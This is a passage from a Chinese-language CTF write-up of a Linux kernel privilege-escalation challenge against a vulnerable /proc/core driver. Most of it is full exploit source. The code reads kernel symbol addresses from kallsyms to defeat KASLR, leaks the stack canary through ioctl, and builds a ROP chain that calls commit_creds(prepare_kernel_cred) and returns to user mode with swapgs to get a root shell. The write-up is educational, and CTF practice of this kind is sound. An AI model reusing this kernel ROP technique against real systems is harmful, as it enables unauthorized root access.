
```c
int get_offset(){
    FILE* fd = fopen("/tmp/kallsyms","r");
    char buff[100];
    while(1){
        if(fgets(buff,100,fd))
        {
            if(strstr(buff,"commit_creds")){
                char des[20] = {0};
                strncpy(des,buff,16);
                sscanf(des,"%llx",&commit_creds);
            }
            if(strstr(buff,"prepare_kernel_cred")){
                char des[20] = {0};
                strncpy(des,buff,16);
                sscanf(des,"%llx",&prepare_kernel_cred);
            }
        }
        else
            break;
    }
    vmlinux_base = commit_creds - 0x9c8e0;
    printf("commit_creds -> %llx\n",commit_creds);
    printf("prepare_kernel_cred -> %llx\n",prepare_kernel_cred);
    printf("vmlinux_base-> %llx\n",vmlinux_base);
    fclose(fd);
    return vmlinux_base - 0xffffffff81000000;
}
```

有了偏移后即得指定具体的`POP_RDI`。

### 4> 完整 exp:

`exp.c`

```c
#include "exp.h"

//###########################func##########################

void reads(int fd, char * buf){
   ioctl(fd,0x6677889B,buf);
}

void setOff(int fd,size_t size){
    ioctl(fd,0x6677889C,size);
}

void copy(int fd,size_t size){
    ioctl(fd,0x6677889A,size);
}

int get_offset(){
    FILE* fd = fopen("/tmp/kallsyms","r");
    char buff[100];
    while(1){
        if(fgets(buff,100,fd))
        {
            if(strstr(buff,"commit_creds")){
                char des[20] = {0};
                strncpy(des,buff,16);
                sscanf(des,"%llx",&commit_creds);
            }
            if(strstr(buff,"prepare_kernel_cred")){
                char des[20] = {0};
                strncpy(des,buff,16);
                sscanf(des,"%llx",&prepare_kernel_cred);
            }
        }
        else
            break;
    }
    vmlinux_base = commit_creds - 0x9c8e0;
    printf("commit_creds -> %llx\n",commit_creds);
    printf("prepare_kernel_cred -> %llx\n",prepare_kernel_cred);
    printf("vmlinux_base-> %llx\n",vmlinux_base);
    fclose(fd);
    return vmlinux_base - 0xffffffff81000000;
}

//###########################main##########################

int main(){
    save();
    int fd = open("/proc/core",2);
    int offset = get_offset();

//###################leak canary#############################################
    char buf[0x40];   //这里开辟0x40的空间 防止后面read时栈溢出
    setOff(fd,0x40);  //canary的偏移为0x40
    reads(fd,buf);  //将数据读入buf
    size_t canary = ((size_t*)buf)[0]; //将buf转为指针格式，取值第一个指针值
    printf("canary -> %p\n",canary);  //打印读入数据

//###################rop #############################################
    size_t rop[0x100] = {0};
    int i = 8;
    rop[i++] = canary;
    rop[i++] = 0; //rbp  //实际调试时rbp位置
    rop[i++] = POP_RDI + offset;
    rop[i++] = 0x6f0;
    rop[i++] = MOV_CR4_RDI + offset;  //这里也可以不用，我开始以为开了smep保护
    rop[i++] = &getRoot;
    rop[i++] = SWAPGS + offset;
    rop[i++] = 0;
    rop[i++] = &intoUserStatus;
    write(fd,rop,sizeof(rop));  //向bss->name 写入数据
    copy(fd,0xffffffffffff0100); //将bss->name 数据复制到 stack中
}
```

### 4> getshell

![](https://img-blog.csdnimg.cn/f4d1d540156e4feca968b8e2862fde42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rmW5Y2X6buE5pmv55Gc,size_20,color_FFFFFF,t_70,g_se,x_16)

参考资料：[lantern.cool/note-pwn-kernel-rop/#分析](https://lantern.cool/note-pwn-kernel-rop/#%E5%88%86%E6%9E%90)
